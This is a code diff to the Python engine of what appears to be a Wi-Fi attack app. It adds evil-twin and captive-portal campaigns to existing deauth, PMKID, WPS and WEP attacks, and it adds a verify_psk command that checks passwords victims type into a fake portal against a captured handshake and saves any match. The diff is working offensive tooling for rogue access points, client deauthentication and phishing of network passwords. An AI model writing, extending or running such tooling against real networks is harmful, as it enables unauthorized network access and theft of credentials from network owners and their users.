@@ -13,9 +13,11 @@ Commands
     {"cmd": "scan", "seconds": 15}      -> {"event": "network", ...} ... {"event": "scan_done"}
                                            (passive saves arrive as "capture_saved" at any time)
     {"cmd": "targets"}                  -> {"event": "targets", "targets": [{...,"attacks":[...]}]}
-    {"cmd": "attack", "kind": "deauth|pmkid|wps", "bssid": ".."}
+    {"cmd": "attack", "kind": "deauth|pmkid|wps|wep|eviltwin|captive", "bssid": ".."}
                                         -> {"event": "attack_started"}, attack_log/attack_progress,
                                            then {"event": "attack_done", "ok": .., "summary": ..}
+    {"cmd": "verify_psk", "bssid": "..", "psk": ".."}
+                                        -> {"event": "psk_verified", "ok": bool}
     {"cmd": "attack_status"}            -> {"event": "attack_status", "running": bool, ...}
     {"cmd": "stop_attack"}              -> the running campaign stops; attack_done follows
     {"cmd": "captures"}                 -> {"event": "captures", "captures": [...]}
@@ -48,7 +50,7 @@ import time
 import traceback
 from pathlib import Path
 
-VERSION = "0.5.0"
+VERSION = "0.6.0"
 
 # A cold start races wifi4's USB poller: its first reconcile still has to list the devices and
 # ask the app for a descriptor, so the very first `devices` answer is legitimately empty. Wait
@@ -324,6 +326,9 @@ class Engine:
         self.crack_capture = ""
         self.crack_ssid = ""
         self.crack_bssid = ""
+        # The captive-portal password that matched a captured M2; attack_done carries it.
+        self.captive_psk = ""
+        self.campaign_twin_bssid = ""
         self.crack_task = None
         # Passive capture: wifi4 collects handshakes/PMKIDs/WEP IVs while the radio is up;
         # the app must save them without an active campaign, as the desktop watcher does.
@@ -691,6 +696,8 @@ class Engine:
             ("pmkid", "wifi4.campaigns.pmkid", "PmkidHarvestAttack"),
             ("wps", "wifi4.campaigns.pin", "WpsCampaign"),
             ("pbc", "wifi4.campaigns.pbc", "WpsPbcCampaign"),
+            ("eviltwin", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
+            ("captive", "wifi4.campaigns.eviltwin", "EvilTwinCampaign"),
         ):
             try:
                 registry[kind] = getattr(importlib.import_module(module), name)
@@ -761,7 +768,57 @@ class Engine:
             })
         emit("targets", count=len(targets), targets=targets)
 
-    async def attack(self, kind, bssid):
+    def evil_twin_input(self, ap, options):
+        """The TUI modal's output, filled with safe defaults for the app's one-card flow.
+
+        wifi4's EvilTwin TUI asks for a host/punter interface, a BSSID, a channel and which
+        eviction frames to send.  The app sends those choices in ``options``; when it does
+        not, the first usable member hosts and punts on the target channel, with the twin
+        BSSID one above the target's (same-BSSID on the same channel is a collision).
+        """
+        from wifi4.campaigns.eviltwin import EvilTwinInput, PuntMode, default_punt_modes
+        from wifi4.chips.driver import FakeMacSupport
+        from wifi4.wlan.array import fake_mac_rank
+
+        options = options or {}
+        members = [m for m in (self.array.members if self.array is not None else [])
+                   if getattr(m, "driver", None) is not None]
+        hosts = [m for m in members
+                 if getattr(m.driver, "FAKE_MAC", None) in
+                 (FakeMacSupport.SPOOFABLE, FakeMacSupport.FIXED_MAC)]
+        if hosts:
+            members = hosts
+        if not members:
+            raise ValueError("EvilTwin needs a live adapter")
+        members.sort(key=fake_mac_rank)
+        twin = members[0]
+        bssid = str(options.get("twin_bssid") or "").lower()
+        if not re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", bssid):
+            last = int(ap.bssid[-1], 16)
+            bssid = ap.bssid[:-1] + format((last + 1) % 16, "x")
+        try:
+            channel = int(options.get("twin_channel") or ap.channel)
+        except (TypeError, ValueError):
+            channel = ap.channel
+        modes = []
+        if str(options.get("punt", "auto")) != "none":
+            selected = options.get("punt_modes")
+            if isinstance(selected, list) and selected:
+                wanted = {str(item) for item in selected}
+                modes = [mode for mode in PuntMode if mode.name.lower() in wanted]
+            else:
+                modes = list(default_punt_modes(ap))
+        period = options.get("punt_period", 30.0)
+        try:
+            period = None if period is None else float(period)
+        except (TypeError, ValueError):
+            period = 30.0
+        return EvilTwinInput(twin_iface=twin, punt_iface=twin, twin_channel=channel,
+                             twin_bssid=bssid, punt_modes=tuple(modes),
+                             punt_period_sec=period,
+                             punt_once=bool(options.get("punt_once", False)))
+
+    async def attack(self, kind, bssid, options=None):
         """Runs one wifi4 campaign against one AP, streaming its own status to the app."""
         if self.campaign is not None and not self.campaign.done:
             emit("error", message="an attack is already running")
@@ -790,7 +847,7 @@ class Engine:
                 if not getattr(ap, "wps_pbc_active", False):
                     emit("error", message="WPS Push-Button window is not open")
                     return
-            elif not campaign_cls.visible(ap):
+            elif kind not in ("eviltwin", "captive") and not campaign_cls.visible(ap):
                 emit("error", message=f"{campaign_cls.idle_label} does not apply to this network")
                 return
             reason = campaign_cls.ineligible_reason(ap)
@@ -809,6 +866,14 @@ class Engine:
         try:
             if kind == "wep":
                 campaign = campaign_cls(self.array, ap, log_callback=campaign_log)
+            elif kind in ("eviltwin", "captive"):
+                evil_options = dict(options or {})
+                if kind == "captive":
+                    # The portal is host-only: no deauth/punt on a single card, and the captured
+                    # M2 is what the password dialog verifies against.
+                    evil_options["punt"] = "none"
+                evil_input = self.evil_twin_input(ap, evil_options)
+                campaign = campaign_cls(self.array, ap, evil_input=evil_input)
             else:
                 campaign = campaign_cls(self.array, ap, log=campaign_log)
             started = campaign.run()
@@ -824,6 +889,8 @@ class Engine:
         self.campaign = campaign
         self.campaign_kind = kind
         self.campaign_ap = ap
+        self.captive_psk = ""
+        self.campaign_twin_bssid = str(getattr(campaign, "twin_bssid", "") or "").lower()
         self._rate_snapshot = None
         self._rate_at = 0.0
         self.campaign_started = time.monotonic()
@@ -878,6 +945,11 @@ class Engine:
             await asyncio.sleep(0.1)
         try:
             self.harvest(getattr(campaign, "ap", None))
+            if kind in ("eviltwin", "captive"):
+                # The client's M2 lands on the twin's BSSID, not the real AP's row.
+                twin = getattr(campaign, "twin_bssid", None)
+                if twin and self.array is not None:
+                    self.harvest(pool_access_points(self.array).get(str(twin).lower()))
         except Exception:  # noqa: BLE001
             pass
         outcome = self.campaign_outcome(campaign, kind)
@@ -924,8 +996,7 @@ class Engine:
         except Exception:  # noqa: BLE001 - reporting a win must never crash the attack loop
             log(traceback.format_exc())
 
-    @staticmethod
-    def campaign_outcome(campaign, kind):
+    def campaign_outcome(self, campaign, kind):
         """What the card says when a campaign ends: one summary, one detail line."""
         if kind == "deauth":
             captured = bool(getattr(campaign, "captured", False))
@@ -971,6 +1042,19 @@ class Engine:
                 return {"ok": True, "summary": "WPS PBC PSK recovered", "detail": psk,
                         "keys": [psk]}
             return {"ok": False, "summary": "WPS PBC failed", "detail": detail, "keys": []}
+        if kind in ("eviltwin", "captive"):
+            captured = bool(getattr(campaign, "captured", False))
+            if kind == "captive":
+                if self.captive_psk:
+                    return {"ok": True, "summary": "Captive portal verified",
+                            "detail": f"PSK {self.captive_psk}",
+                            "keys": [self.captive_psk]}
+                return {"ok": False, "summary": "Captive portal ended",
+                        "detail": "no password matched the captured handshake", "keys": []}
+            return {"ok": captured,
+                    "summary": "Evil Twin captured a handshake" if captured else "Evil Twin stopped",
+                    "detail": "crackable M2 saved" if captured else "no client joined the twin",
+                    "keys": []}
         if kind == "wep":
             key = getattr(campaign, "recovered_key", None)
             if key:
@@ -1431,6 +1515,56 @@ class Engine:
         except Exception as exc:  # noqa: BLE001
             emit("error", message=f"cannot stop the crack: {type(exc).__name__}: {exc}")
 
+    async def verify_psk(self, bssid, psk):
+        """Checks a candidate passphrase against the AP's captured hashlines.
+
+        This is the verification half of the captive-portal flow: the fake AP captures an M2,
+        the caller submits the password a client entered, and ``psk_verdict`` proves whether
+        that password produced the captured MIC.  A match is saved as a recovered PSK and, while
+        the portal campaign is running, stops it.
+        """
+        from wifi4.crack.hc22000_format import read_hc22000
+        from wifi4.crack.wpa_psk import psk_verdict
+        from wifi4.persist.save import save_wpa_psk
+
+        target = str(bssid or "").lower()
+        candidate = str(psk or "")
+        ap = self.ap_for(target)
+        if ap is not None:
+            self.harvest(ap)
+        wanted = {target}
+        if self.campaign_kind == "captive" and self.campaign_twin_bssid:
+            wanted.add(self.campaign_twin_bssid)
+        compacts = {value.replace(":", "") for value in wanted}
+        lines = []
+        try:
+            for path in captures_dir().glob("*.hc22000"):
+                for _raw, line in read_hc22000(str(path)):
+                    if getattr(line, "mac_ap", "") in compacts:
+                        lines.append(line)
+        except Exception as exc:  # noqa: BLE001
+            emit("psk_verified", ok=False, bssid=target,
+                 message=f"cannot read the capture: {type(exc).__name__}: {exc}")
+            return
+        if not lines:
+            emit("psk_verified", ok=False, bssid=target,
+                 message="no handshake captured yet: wait for a client, then verify")
+            return
+        verdict = psk_verdict([candidate], lines)
+        if verdict:
+            try:
+                save_wpa_psk(getattr(ap, "ssid", None), target, candidate)
+            except Exception:  # noqa: BLE001 - the verified key is still returned to the app
+                log(traceback.format_exc())
+            self.captive_psk = candidate
+            emit("psk_verified", ok=True, bssid=target, psk=candidate)
+            if (self.campaign is not None and not self.campaign.done
+                    and self.campaign_kind == "captive"):
+                self.campaign.request_stop()
+        else:
+            emit("psk_verified", ok=False, bssid=target,
+                 message="password does not match the captured handshake")
+
     async def attack_status(self):
         """The campaign that is running right now, so a screen opened mid-attack can show it."""
         campaign = self.campaign
@@ -1525,7 +1659,10 @@ async def main():
             elif name == "targets":
                 await engine.targets()
             elif name == "attack":
-                await engine.attack(command.get("kind"), command.get("bssid"))
+                await engine.attack(command.get("kind"), command.get("bssid"),
+                                    command.get("options"))
+            elif name == "verify_psk":
+                await engine.verify_psk(command.get("bssid"), command.get("psk"))
             elif name == "attack_status":
                 await engine.attack_status()
             elif name == "stop_attack":
